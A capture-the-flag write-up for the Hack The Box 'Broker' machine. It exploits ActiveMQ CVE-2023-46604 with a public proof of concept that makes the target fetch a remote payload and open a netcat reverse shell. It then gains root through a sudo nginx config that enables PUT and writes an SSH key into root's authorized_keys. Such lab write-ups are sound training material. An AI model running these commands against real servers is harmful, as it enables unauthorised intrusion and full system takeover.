---
title: "Broker - Writeup"
linkTitle: "Broker"
weight: 5
featured: true
platform: "HTB"
name: "Broker"
os: "Linux"
difficulty: "Easy"
points: 20
release: "09 Nov 2023"
ip: "10.129.230.87"
# Drop a real avatar at static/img/htb/broker.png and uncomment:
# avatar: "/img/htb/broker.png"
tags: ["linux", "activemq", "cve-2023-46604", "openfire-deserialization", "sudo-nginx", "ssh-key-write", "root-shell"]
description: "Easy Linux box released alongside the critical CVE-2023-46604 disclosure. An unauthenticated ActiveMQ deserialization exploit gives a shell, and a sudo nginx misconfiguration hands over root through a rogue config that writes an SSH key."
---

{{< htb name="Broker" os="Linux" difficulty="Easy" points="20" release="09 Nov 2023" ip="10.129.230.87" platform="HTB" >}}

## Reconnaissance

```
(root㉿kali)# nmap 10.129.230.87 -p- -T4 --open
```

```
PORT      STATE SERVICE
22/tcp    open  ssh
80/tcp    open  http
1883/tcp  open  mqtt
5672/tcp  open  amqp
8161/tcp  open  http
61613/tcp open  unknown
61614/tcp open  unknown
61616/tcp open  unknown
```

```
(root㉿kali)# nmap 10.129.230.87 -p22,80,1883,5672,8161,61613,61614,61616 -sCV
```

```
80/tcp    open  http    nginx 1.18.0 (Ubuntu)
|_http-auth-type: Basic
8161/tcp  open  http    Jetty 9.4.39 (ActiveMQ web console)
61616/tcp open  apachemq ActiveMQ OpenWire transport 5.15.15
```

Port 80 requires HTTP basic auth, port 8161 is the ActiveMQ web console, and port 61616 is the OpenWire transport connector.

## Enumeration

Port 80 prompts HTTP basic auth immediately.

![HTTP Basic Auth prompt when browsing to port 80](/img/htb/broker/01-http-basic-auth.png)

Default credentials (`admin:admin`) let through, and the page behind them is the ActiveMQ welcome page.

![Apache ActiveMQ welcome page after logging in](/img/htb/broker/02-activemq-welcome.png)

The admin console on port 8161 confirms the exact version.

![ActiveMQ admin console showing version 5.15.15](/img/htb/broker/03-activemq-admin-console.png)

```
Version: 5.15.15
```

ActiveMQ < 5.15.16 is affected by **CVE-2023-46604**, a critical (CVSS 10.0) unauthenticated RCE in the OpenWire protocol unmarshaller. The vulnerability lets an attacker force the broker to instantiate an arbitrary class by sending a crafted ClassInfo packet over the OpenWire transport on port 61616.

## Initial Foothold

```
(root㉿kali)# git clone https://github.com/evkl1d/CVE-2023-46604
(root㉿kali)# cd CVE-2023-46604
```

Edit `poc.xml` to point the callback URL at your own HTTP server, then serve it and trigger the exploit.

```
(root㉿kali)# python3 -m http.server 80
(root㉿kali)# python3 exploit.py -i 10.129.230.87 -p 61616 -u http://10.10.15.249/poc.xml
```

```
(root㉿kali)# rlwrap nc -lnvp 9001
```

```
connect to [10.10.15.249] from (UNKNOWN) [10.129.230.87] 54422
activemq@broker:~$
```

Shell lands as `activemq`.

## Privilege Escalation

```
activemq@broker:~$ sudo -l
```

```
User activemq may run the following commands on broker:
    (ALL : ALL) NOPASSWD: /usr/sbin/nginx
```

`activemq` can run any `nginx` invocation as root with no password, including spawning a completely custom config. The plan: write a config that enables HTTP PUT, start it, then use PUT to write an SSH key into `/root/.ssh/authorized_keys`.

Generate the keypair first.

```
(root㉿kali)# ssh-keygen -t ed25519 -C "shahad@htb" -f ./broker_key -N ""
```

![ssh-keygen generating the ed25519 keypair](/img/htb/broker/04-ssh-keygen.png)

Write a minimal nginx config that enables PUT on the filesystem root.

```
activemq@broker:~$ cat > /tmp/evil.conf << 'EOF'
user root;
events {}
http {
    server {
        listen 1339;
        root /;
        dav_methods PUT;
    }
}
EOF
```

Start nginx as root using the evil config.

```
activemq@broker:~$ sudo /usr/sbin/nginx -c /tmp/evil.conf
```

Upload the public key directly to root's `authorized_keys` via PUT.

```
(root㉿kali)# curl -s -X PUT http://10.129.230.87:1339/root/.ssh/authorized_keys -d "$(cat broker_key.pub)"
```

SSH in as root using the matching private key.

```
(root㉿kali)# ssh -i broker_key root@10.129.230.87
```

```
root@broker:~# cat root.txt
```

## Lessons learned

- A CVSS 10.0 rating on a service running by default is worth checking immediately after version fingerprinting. CVE-2023-46604 was disclosed the same week this box released, and this exact version was the one in the advisory.
- `sudo nginx` with no restriction on the config file path is effectively `sudo bash`. Any binary that accepts a config file and runs as root can be turned into arbitrary file read and write, always think about what the allowed binary's own features can do at that privilege level.
- HTTP PUT through nginx running as root bypasses all filesystem permissions. Writing to `/root/.ssh/authorized_keys` works even if the file doesn't exist, because the nginx process is root and creates it directly.
